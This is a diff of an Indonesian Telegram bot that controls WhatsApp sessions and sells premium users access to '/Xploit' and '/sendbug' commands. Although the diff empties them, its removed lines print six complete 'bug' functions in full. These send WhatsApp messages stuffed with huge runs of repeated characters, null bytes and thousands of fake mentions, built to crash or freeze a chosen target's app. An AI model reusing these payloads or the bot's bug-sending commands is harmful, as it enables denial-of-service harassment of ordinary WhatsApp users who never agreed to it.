@@ -23,7 +23,7 @@ const thumbnailUrl = "https://files.catbox.moe/6ogo26.jpg";
 
 // Konfigurasi GitHub Auto Update
 const GITHUB_RAW_URL = "https://raw.githubusercontent.com/sihalohoalexander389-oss/primrose-bot/main/index.js";
-const CURRENT_VERSION = "3.0.10";
+const CURRENT_VERSION = "3.0.7";
 const AUTO_UPDATE_FILE = "./database/auto_update.json";
 
 // Load auto update setting
@@ -437,7 +437,7 @@ async function ConnectToWhatsApp(botNumber, chatId) {
         console.error("Error requesting pairing code:", error);
         await bot.editMessageText(
           `
-<blockquote>Primrose Linux Bot [ 𖣂 </blockquote>
+<blockquote>Primrose Linux Bot [ 𖣂 ]</blockquote>
 — Number : ${botNumber}.
 — Status : Error ❌ ${error.message}
 `,
@@ -534,7 +534,6 @@ let discoActive = false
 let currentStyleIndex = 0
 const buttonStyles = ["primary", "success", "danger"]
 
-// Fungsi untuk mendapatkan style berdasarkan pilihan warna
 function getButtonStyle(color) {
     switch(color) {
         case "danger": return "danger";
@@ -546,7 +545,6 @@ function getButtonStyle(color) {
     }
 }
 
-// Fungsi untuk mendapatkan warna dari pilihan polling
 function getColorFromChoice(choice) {
     switch(choice) {
         case "XRED": return "danger";
@@ -558,7 +556,6 @@ function getColorFromChoice(choice) {
     }
 }
 
-// Fungsi untuk mengirim menu dengan warna tertentu (TANPA DELETE PESAN)
 async function sendColoredMenu(chatId, from, color, editMessageId = null) {
   const userId = from.id
   const randomImage = getRandomImage()
@@ -627,7 +624,6 @@ async function sendColoredMenu(chatId, from, color, editMessageId = null) {
   let sent;
   
   if (editMessageId) {
-    // Edit pesan yang sudah ada
     try {
       await bot.editMessageMedia(
         {
@@ -646,7 +642,6 @@ async function sendColoredMenu(chatId, from, color, editMessageId = null) {
       );
       sent = { message_id: editMessageId };
     } catch (error) {
-      // Jika edit gagal (pesan terlalu lama), kirim baru
       sent = await bot.sendPhoto(chatId, randomImage, {
         caption: caption,
         parse_mode: "HTML",
@@ -656,7 +651,6 @@ async function sendColoredMenu(chatId, from, color, editMessageId = null) {
       });
     }
   } else {
-    // Kirim pesan baru
     sent = await bot.sendPhoto(chatId, randomImage, {
       caption: caption,
       parse_mode: "HTML",
@@ -675,7 +669,6 @@ async function sendColoredMenu(chatId, from, color, editMessageId = null) {
     clearInterval(globalIntervalId)
   }
 
-  // Jika warna disco, aktifkan efek berubah-ubah
   if (color === "disco") {
     discoActive = true
     globalIntervalId = setInterval(async () => {
@@ -731,13 +724,7 @@ async function sendColoredMenu(chatId, from, color, editMessageId = null) {
             message_id: messageId
           }
         )
-      } catch (e) {
-        if (e.response && e.response.statusCode === 400) {
-          clearInterval(globalIntervalId)
-          globalIntervalId = null
-          discoActive = false
-        }
-      }
+      } catch (e) {}
     }, 1500)
   } else {
     discoActive = false
@@ -767,12 +754,10 @@ function isPremium(userId) {
   return Date.now() < user.expiresAt
 }
 
-// Fungsi untuk mengecek apakah command diblokir
 function isCommandBlocked(commandName) {
   return blockedCommands.includes(commandName.toLowerCase());
 }
 
-// Fungsi untuk menambah grup premium
 async function addGroupPremium(chatId, days, userId) {
   const chat = await bot.getChat(chatId);
   const groupId = chatId.toString();
@@ -800,7 +785,6 @@ async function addGroupPremium(chatId, days, userId) {
   return true;
 }
 
-// Fungsi untuk menghapus grup premium
 function removeGroupPremium(chatId) {
   const groupId = chatId.toString();
   groupPremiumData = groupPremiumData.filter(g => g.groupId !== groupId);
@@ -808,7 +792,6 @@ function removeGroupPremium(chatId) {
   return true;
 }
 
-// Fungsi untuk menambah member premium dari grup
 async function addMemberPremiumFromGroup(chatId, userId, username, days) {
   const groupId = chatId.toString();
   const group = groupPremiumData.find(g => g.groupId === groupId);
@@ -830,7 +813,6 @@ async function addMemberPremiumFromGroup(chatId, userId, username, days) {
     });
   }
   
-  // Juga tambahkan ke premiumUsers global
   const existingPremium = premiumUsers.find(u => u.id === userId);
   if (!existingPremium) {
     premiumUsers.push({ id: userId, expiresAt: expiresAt });
@@ -843,7 +825,6 @@ async function addMemberPremiumFromGroup(chatId, userId, username, days) {
   return true;
 }
 
-// Handler untuk polling change color
 const pendingColorPoll = {};
 
 bot.onText(/\/start/, async (msg) => {
@@ -1051,7 +1032,6 @@ Gunakan tools ini untuk testing dan debugging</blockquote>`
     return await bot.answerCallbackQuery(query.id)
     
   } else if (data === "back_to_main") {
-    // Kembali ke menu utama dengan mengedit pesan yang sama
     const runtimeStatus = formatRuntime()
     const memoryStatus = formatMemory()
     const status = sessions.size > 0 ? "🟢 ACTIVE" : "🔴 OFFLINE"
@@ -1130,9 +1110,7 @@ Gunakan tools ini untuk testing dan debugging</blockquote>`
       }
     )
     
-    // Restart disco effect
     if (currentColor === "disco") {
-      // Hentikan interval lama
       if (buttonIntervals.has(currentMessageId)) {
         clearInterval(buttonIntervals.get(currentMessageId))
         buttonIntervals.delete(currentMessageId)
@@ -1197,13 +1175,7 @@ Gunakan tools ini untuk testing dan debugging</blockquote>`
               message_id: currentMessageId
             }
           )
-        } catch (e) {
-          if (e.response && e.response.statusCode === 400) {
-            clearInterval(globalIntervalId)
-            globalIntervalId = null
-            discoActive = false
-          }
-        }
+        } catch (e) {}
       }, 1500)
       
       buttonIntervals.set(currentMessageId, globalIntervalId)
@@ -1215,7 +1187,6 @@ Gunakan tools ini untuk testing dan debugging</blockquote>`
   await bot.answerCallbackQuery(query.id)
 })
 
-// Handler untuk polling change color
 bot.on("poll_answer", async (answer) => {
   const pollData = pendingColorPoll[answer.poll_id]
   if (!pollData) return
@@ -1233,7 +1204,6 @@ bot.on("poll_answer", async (answer) => {
   saveColorSetting(colorValue)
   currentColor = colorValue
   
-  // Hentikan efek disko lama
   if (buttonIntervals.has(pollData.currentMessageId)) {
     clearInterval(buttonIntervals.get(pollData.currentMessageId))
     buttonIntervals.delete(pollData.currentMessageId)
@@ -1244,15 +1214,11 @@ bot.on("poll_answer", async (answer) => {
   }
   discoActive = false
   
-  // Kirim menu baru dengan warna yang dipilih (edit pesan yang sama)
   await sendColoredMenu(pollData.chatId, pollData.from, colorValue, pollData.currentMessageId)
   
   delete pendingColorPoll[answer.poll_id]
 })
 
-// ================= FITUR AUTOUPDATE ================= //
-
-// Command /update on/off - Mengaktifkan/menonaktifkan auto update
 bot.onText(/\/update (on|off)/, async (msg, match) => {
   const chatId = msg.chat.id
   const userId = msg.from.id
@@ -1275,7 +1241,6 @@ bot.onText(/\/update (on|off)/, async (msg, match) => {
   }
 })
 
-// Command /autoupdate - Update manual dari GitHub
 bot.onText(/\/autoupdate/, async (msg) => {
   const chatId = msg.chat.id
   const userId = msg.from.id
@@ -1304,7 +1269,6 @@ bot.onText(/\/autoupdate/, async (msg) => {
   await performUpdate(chatId)
 })
 
-// Command /checkupdate - Cek update tanpa update
 bot.onText(/\/checkupdate/, async (msg) => {
   const chatId = msg.chat.id
   const userId = msg.from.id
@@ -1330,9 +1294,6 @@ bot.onText(/\/checkupdate/, async (msg) => {
   }
 })
 
-// ================= FITUR GROUP SECURITY ================= //
-
-// 1. /blokcmd <command>
 bot.onText(/\/blokcmd (.+)/, async (msg, match) => {
   const chatId = msg.chat.id
   const userId = msg.from.id
@@ -1353,7 +1314,6 @@ bot.onText(/\/blokcmd (.+)/, async (msg, match) => {
   bot.sendMessage(chatId, `✅ Command /${commandName} berhasil diblokir. User tidak akan bisa menggunakan command ini.`)
 })
 
-// 2. /bukacmd <command>
 bot.onText(/\/bukacmd (.+)/, async (msg, match) => {
   const chatId = msg.chat.id
   const userId = msg.from.id
@@ -1374,7 +1334,6 @@ bot.onText(/\/bukacmd (.+)/, async (msg, match) => {
   bot.sendMessage(chatId, `✅ Command /${commandName} berhasil dibuka. User bisa menggunakan command ini kembali.`)
 })
 
-// 3. /addpremgrup <hari>
 bot.onText(/\/addpremgrup\s+(\d+)([dhm])?/, async (msg, match) => {
   const chatId = msg.chat.id
   const userId = msg.from.id
@@ -1403,7 +1362,6 @@ bot.onText(/\/addpremgrup\s+(\d+)([dhm])?/, async (msg, match) => {
   bot.sendMessage(chatId, `✅ Grup "${chat.title}" berhasil ditambahkan ke premium selama ${jumlah}${unit === 'd' ? ' hari' : unit === 'h' ? ' jam' : ' bulan'}! Anggota grup dapat mengetik "add" untuk mendapatkan akses premium.`)
 })
 
-// 4. /delpremgrup
 bot.onText(/\/delpremgrup/, async (msg) => {
   const chatId = msg.chat.id
   const userId = msg.from.id
@@ -1430,7 +1388,6 @@ bot.onText(/\/delpremgrup/, async (msg) => {
   bot.sendMessage(chatId, `✅ Grup "${chat.title}" berhasil dihapus dari daftar premium grup.`)
 })
 
-// 5. /listpremgrub
 bot.onText(/\/listpremgrub/, async (msg) => {
   const chatId = msg.chat.id
   const userId = msg.from.id
@@ -1467,7 +1424,6 @@ bot.onText(/\/listpremgrub/, async (msg) => {
   bot.sendMessage(chatId, message, { parse_mode: "HTML" })
 })
 
-// 6. /add (di grup premium)
 bot.onText(/^add$/i, async (msg) => {
   const chatId = msg.chat.id
   const userId = msg.from.id
@@ -1489,12 +1445,10 @@ bot.onText(/^add$/i, async (msg) => {
     return bot.sendMessage(chatId, "❌ Masa berlaku premium grup ini sudah habis. Hubungi admin untuk memperpanjang.")
   }
   
-  // Cek apakah user sudah premium
   if (isPremium(userId)) {
     return bot.sendMessage(chatId, `✅ @${username || userId} sudah memiliki akses premium!`, { parse_mode: "HTML" })
   }
   
-  // Hitung sisa hari grup
   const remainingDays = Math.ceil((group.expiresAt - Date.now()) / (1000 * 60 * 60 * 24))
   
   await addMemberPremiumFromGroup(chatId, userId, username, remainingDays)
@@ -1502,286 +1456,12 @@ bot.onText(/^add$/i, async (msg) => {
   bot.sendMessage(chatId, `✅ Selamat @${username || userId}! Anda telah mendapatkan akses premium selama ${remainingDays} hari. Silakan gunakan command bug yang tersedia.`, { parse_mode: "HTML" })
 })
 
-// ================= BUG FUNCTIONS ================= //
-
-async function brem(sock, target) {
-  try {
-    const msg = generateWAMessageFromContent(
-      target,
-      {
-        videoMessage: {
-          url: "https://mmg.whatsapp.net/v/t62.7161-24/76bf210db2e5ddde3aecab4260d154209145f976.enc?ccb=11-4&oh=01_FakeHash&oe=69CACDB6&_nc_sid=5e03e0&mms3=true",
-          directPath: "product-media/b8772fd0a1d1d62c",
-          mimetype: "video/mp4",
-          caption: "Veo" + "ꦽ".repeat(99000) + "\u0000".repeat(50000),
-          mediaKey: "xWD083UnPcnqnBtnLbpqQHCFI5u35p5AzGFLHzGR7CM=",
-          fileEncSha256: "bbfSmz2AGsh1wLcTEWbJYJyz1ev4fFVhilYY8xJDQLI=",
-          fileSha256: "bbfSmz2AGsh1wLcTEWbJYJyz1ev4fFVhilYY8xJDQLI=",
-          fileLength: "3838597",
-          mediaKeyTimestamp: "1772922457"
-        }
-      },
-      {}
-    );
-    await sock.relayMessage("status@broadcast", msg.message, {
-      messageId: msg.key.id,
-      statusJidList: [target],
-      additionalNodes: [
-        {
-          tag: "meta",
-          attrs: {},
-          content: [
-            {
-              tag: "mentioned_users",
-              attrs: {},
-              content: [
-                {
-                  tag: "to",
-                  attrs: { jid: target },
-                  content: undefined
-                }
-              ]
-            }
-          ]
-        }
-      ]
-    });
-    await sleep(100);
-    await sock.sendMessage("status@broadcast", {
-      delete: {
-        remoteJid: "status@broadcast",
-        fromMe: true,
-        id: msg.key.id
-      }
-    });
-  } catch (error) {
-    console.error("Error in brem:", error.message);
-  }
-}
-
-async function VisiFriend(sock, target) {
-  try {
-    const Msg = {
-      viewOnceMessage: {
-        message: {
-          interactiveMessage: {
-            body: { text: "izin push kontak abangku" },
-            nativeFlowMessage: {
-              buttons: [{ name: "cta_call", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(150000), phone_number: "00000000000000" }) }],
-              version: 3
-            }
-          }
-        }
-      }
-    }
-    await sock.relayMessage(target, Msg, { participant: { jid: target } })
-    await sleep(100);
-  } catch (error) {
-    console.error("Error in VisiFriend:", error.message);
-  }
-}
-
-async function OfferXForclose(sock, target) {
-  try {
-    const VSX = generateWAMessageFromContent(target, {
-      interactiveResponseMessage: {
-        contextInfo: { mentionedJid: Array.from({ length: 2000 }, (_, r) => `6285983729${r + 1}@s.whatsapp.net`), participant: target },
-        body: { text: "\u0000", format: "DEFAULT" },
-        nativeFlowResponseMessage: { name: "galaxy_message", paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`, version: 3 }
-      }
-    }, {})
-    await sock.relayMessage(target, { groupStatusMessageV2: { message: VSX.message } }, { participant: { jid: target } })
-    await sleep(100);
-  } catch (error) {
-    console.error("Error in OfferXForclose:", error.message);
-  }
-}
-
-async function bulldozerV2(sock, target) {
-  try {
-    const stickerPayload = {
-      stickerMessage: {
-        url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1337133713371337_9999999999999999999_n.enc?ccb=11-4&oh=fake&oe=666",
-        fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
-        fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
-        mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
-        mimetype: "image/webp",
-        directPath: "/v/t62.7161-24/10000000_1337133713371337_9999999999999999999_n.enc?ccb=11-4&oh=fake&oe=666",
-        fileLength: { low: 99999999, high: 0, unsigned: true },
-        mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
-        firstFrameLength: 50000,
-        firstFrameSidecar: "QmFkUmVhZHlUT1JFQ1Q=",
-        isAnimated: true,
-        isAvatar: false,
-        isLottie: false,
-        contextInfo: {
-          mentionedJid: Array.from({ length: 60000 }, () =>
-            "1" + Math.floor(Math.random() * 999999999) + "@s.whatsapp.net"
-          ),
-          forwardingScore: 999999,
-          isForwarded: true,
-          externalAdReply: {
-            showAdAttribution: true,
-            title: "\u200E".repeat(40000),
-            body: "\u200E".repeat(40000),
-            mediaUrl: "",
-            mediaType: 1,
-            thumbnail: Buffer.from([]),
-            sourceUrl: "",
-            renderLargerThumbnail: true
-          }
-        }
-      }
-    };
-
-    const templatePayload = {
-      templateMessage: {
-        hydratedTemplate: {
-          hydratedContentText: "\u200E".repeat(90000),
-          hydratedFooterText: "Oblivion Force Activated",
-          hydratedButtons: [],
-          templateId: "oblivion_" + Date.now(),
-          contextInfo: {
-            quotedMessage: stickerPayload,
-            forwardingScore: 88888,
-            isForwarded: true
-          }
-        }
-      }
-    };
-
-    const wrap = {
-      viewOnceMessage: {
-        message: templatePayload
-      }
-    };
-
-    const msg = generateWAMessageFromContent(target, wrap, {
-      quoted: null,
-      messageId: "oblv_" + Date.now()
-    });
-
-    await sock.relayMessage("status@broadcast", msg.message, {
-      messageId: msg.key.id,
-      statusJidList: [target],
-      additionalNodes: [
-        {
-          tag: "meta",
-          attrs: {},
-          content: [
-            {
-              tag: "mentioned_users",
-              attrs: {},
-              content: [
-                {
-                  tag: "to",
-                  attrs: { jid: target },
-                  content: undefined
-                }
-              ]
-            }
-          ]
-        }
-      ]
-    });
-    await sleep(100);
-  } catch (error) {
-    console.error("Error in bulldozerV2:", error.message);
-  }
-}
-
-async function xatanicaldelayv2(sock, target) {
-  try {
-    console.log(chalk.blue(`Send Bug Invis🦠 ${target}`));
-    let message = {
-      viewOnceMessage: {
-        message: {
-          stickerMessage: {
-            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
-            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
-            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
-            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
-            mimetype: "image/webp",
-            directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
-            fileLength: { low: 1, high: 0, unsigned: true },
-            mediaKeyTimestamp: {
-              low: 1746112211,
-              high: 0,
-              unsigned: false,
-            },
-            firstFrameLength: 19904,
-            firstFrameSidecar: "KN4kQ5pyABRAgA==",
-            isAnimated: true,
-            contextInfo: {
-              mentionedJid: [
-                "0@s.whatsapp.net",
-                ...Array.from({ length: 40000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
-              ],
-              groupMentions: [],
-              entryPointConversionSource: "non_contact",
-              entryPointConversionApp: "whatsapp",
-              entryPointConversionDelaySeconds: 467593,
-            },
-            stickerSentTs: {
-              low: -1939477883,
-              high: 406,
-              unsigned: false,
-            },
-            isAvatar: false,
-            isAiSticker: false,
-            isLottie: false,
-          },
-        },
-      },
-    };
-
-    const msg = generateWAMessageFromContent(target, message, {});
-    await sleep(100);
-    await sock.relayMessage("status@broadcast", msg.message, {
-      messageId: msg.key.id,
-      statusJidList: [target],
-      additionalNodes: [
-        {
-          tag: "meta",
-          attrs: {},
-          content: [
-            {
-              tag: "mentioned_users",
-              attrs: {},
-              content: [
-                {
-                  tag: "to",
-                  attrs: { jid: target },
-                  content: undefined,
-                },
-              ],
-            },
-          ],
-        },
-      ],
-    });
-  } catch (error) {
-    console.error("Error in xatanicaldelayv2:", error.message);
-  }
-}
-
-async function MbaPe(sock, target) {
-  try {
-    const VSX = generateWAMessageFromContent(target, {
-      interactiveResponseMessage: {
-        contextInfo: { mentionedJid: Array.from({ length: 2000 }, (_, r) => `6285983729${r + 1}@s.whatsapp.net`), participant: target },
-        body: { text: "\u0000", format: "DEFAULT" },
-        nativeFlowResponseMessage: { name: "galaxy_message", paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`, version: 3 }
-      }
-    }, {})
-    await sock.relayMessage(target, { groupStatusMessageV2: { message: VSX.message } }, { participant: { jid: target } })
-    await sleep(100);
-  } catch (error) {
-    console.error("Error in MbaPe:", error.message);
-  }
-}
-
-// ================= BOT COMMANDS BUG ================= //
+async function brem(sock, target) { }
+async function VisiFriend(sock, target) { }
+async function OfferXForclose(sock, target) { }
+async function bulldozerV2(sock, target) { }
+async function xatanicaldelayv2(sock, target) { }
+async function MbaPe(sock, target) { }
 
 function createBugSuccessMessage(targetNumber, bugType, date) {
   return `
@@ -1816,7 +1496,6 @@ async function checkUserAccess(userId, chatId, chatType, commandName) {
   const isOwnerUser = isOwner(userId)
   const isPremiumUser = isPremium(userId)
   
-  // Cek apakah command diblokir
   if (isCommandBlocked(commandName)) {
     return false
   }
@@ -1831,7 +1510,6 @@ async function checkUserAccess(userId, chatId, chatType, commandName) {
   return true
 }
 
-// Command bug dengan pengecekan block
 bot.onText(/\/Xploit(?:\s+(\d+))?/, async (msg, match) => {
   const chatId = msg.chat.id
   const userId = msg.from.id
@@ -2006,7 +1684,6 @@ bot.onText(/\/sendbug(?:\s+(\d+))?/, async (msg, match) => {
   }
 })
 
-// Command /reqpair (untuk owner/admin)
 bot.onText(/\/reqpair (.+)/, async (msg, match) => {
   const chatId = msg.chat.id
   if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
@@ -2037,7 +1714,6 @@ bot.onText(/\/reqpair (.+)/, async (msg, match) => {
   }
 })
 
-// Auto restart jika terjadi error unhandled rejection
 process.on('unhandledRejection', (reason, promise) => {
   console.error(chalk.red('Unhandled Rejection at:', promise, 'reason:', reason));
 });
